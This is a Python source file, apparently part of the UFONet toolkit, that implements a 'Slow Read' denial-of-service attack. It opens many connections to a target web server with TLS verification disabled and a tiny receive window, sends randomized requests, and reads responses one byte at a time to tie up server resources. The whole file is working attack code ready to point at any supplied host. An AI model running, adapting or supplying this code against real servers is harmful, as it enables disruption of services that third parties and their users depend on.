#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2026 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import socket, ssl, time, random, sys
from urllib.parse import urlparse

# UFONet Slow Read (TRACTOR) - LORIS-style but reading the response 1 byte at a time
# holds the TCP window open by advertising a tiny receive window
def tractorize(host, port, rounds, hold=30):
    n=0
    use_tls = (port == 443)
    ctx = None
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    socks = []
    try:
        for i in range(int(rounds)):
            n += 1
            try:
                raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 256)
                raw.settimeout(10)
                raw.connect((host, port))
                if use_tls:
                    sock = ctx.wrap_socket(raw, server_hostname=host)
                else:
                    sock = raw
                req = (
                    "GET /?_=" + str(random.randint(1, 10**9)) + " HTTP/1.1\r\n"
                    "Host: " + host + "\r\n"
                    "User-Agent: Mozilla/5.0 UFONet-TRACTOR\r\n"
                    "Accept: */*\r\n"
                    "Connection: keep-alive\r\n"
                    "Range: bytes=0-1\r\n"
                    "\r\n"
                )
                sock.sendall(req.encode('utf-8'))
                socks.append(sock)
                print("[Info] [AI] [TRACTOR] 'tractor beam' ["+str(n)+"] -> [CONNECTED!]")
            except Exception as e:
                print("[Error] [AI] [TRACTOR] Failed beam ["+str(n)+"]: " + type(e).__name__)
        deadline = time.time() + hold
        while time.time() < deadline and socks:
            for s in list(socks):
                try:
                    chunk = s.recv(1)
                    if not chunk:
                        socks.remove(s)
                        try: s.close()
                        except Exception: pass
                except socket.timeout:
                    continue
                except Exception:
                    socks.remove(s)
                    try: s.close()
                    except Exception: pass
            time.sleep(2)
    finally:
        for s in socks:
            try: s.close()
            except Exception: pass

class SLOWREAD(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] Slow Read (TRACTOR) is ready to fire: [", rounds, "beams ]")
        port = 80
        if target.startswith('http://'):
            target = target.replace('http://','')
        elif target.startswith('https://'):
            target = target.replace('https://','')
            port = 443
        if '/' in target:
            target = target.split('/', 1)[0]
        if ':' in target:
            target, _p = target.rsplit(':', 1)
            try:
                port = int(_p)
            except Exception:
                pass
        try:
            socket.gethostbyname(target)
        except Exception:
            print("[Info] [AI] [TRACTOR] Could not resolve target -> [Aborting!]")
            return
        tractorize(target, port, rounds)
